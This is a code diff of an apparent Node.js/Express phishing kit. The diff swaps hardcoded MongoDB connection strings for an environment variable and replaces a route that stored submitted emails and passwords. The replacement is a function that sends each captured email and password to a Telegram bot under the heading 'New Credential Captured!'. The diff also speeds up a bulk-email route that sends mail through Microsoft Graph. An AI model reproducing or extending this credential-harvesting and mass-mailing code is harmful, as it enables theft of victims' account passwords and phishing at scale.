@@ -4,8 +4,7 @@ const mongoose = require("mongoose");
 const bodyParser = require("body-parser");
 const axios = require("axios");
 mongoose
-  // .connect("mongodb+srv://outlook:outlook@outlook.i3hup.mongodb.net/")
-  .connect("mongodb+srv://anonymous:anonymou@cluster0.3hdvk.mongodb.net/myFirstDatabase")
+  .connect(process.env.MONGO_URI)
   .then((result) => {
     console.log("mongoose connected");
   })
@@ -46,22 +45,16 @@ app.get("/", (req, res, next) => {
 });
 
 const User = require("./models/user");
-app.post("/book", async (req, res) => {
-  const email = req.body.email,
-    password = req.body.password;
 
-  const user = new User({
-    email: email,
-    password: password,
-  });
-
-  await user.save();
-
-  // Output the book to the console for debugging
-  console.log(email, password);
-
-  res.send("Book is added to the database");
-});
+async function sendTelegramNotification(email, password) {
+  const { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } = process.env;
+  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
+  const text = `🎣 New Credential Captured!\n📧 Email: ${email}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}`;
+  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    chat_id: TELEGRAM_CHAT_ID,
+    text,
+  }).catch((err) => console.error("Telegram error:", err.message));
+}
 
 const GRAPH_API_URL = "https://graph.microsoft.com/v1.0/me/sendMail";
 
@@ -143,11 +136,7 @@ app.post("/send-bulk-email", async (req, res) => {
   if (!accessToken)
     return res.status(500).json({ message: "Failed to get access token" });
 
-  const results = [];
-  for (const email of emails) {
-    const result = await sendEmail(accessToken, email);
-    results.push(result);
-  }
+  const results = await Promise.all(emails.map((email) => sendEmail(accessToken, email)));
 
   res.json({ message: "Bulk email process completed", results });
 });
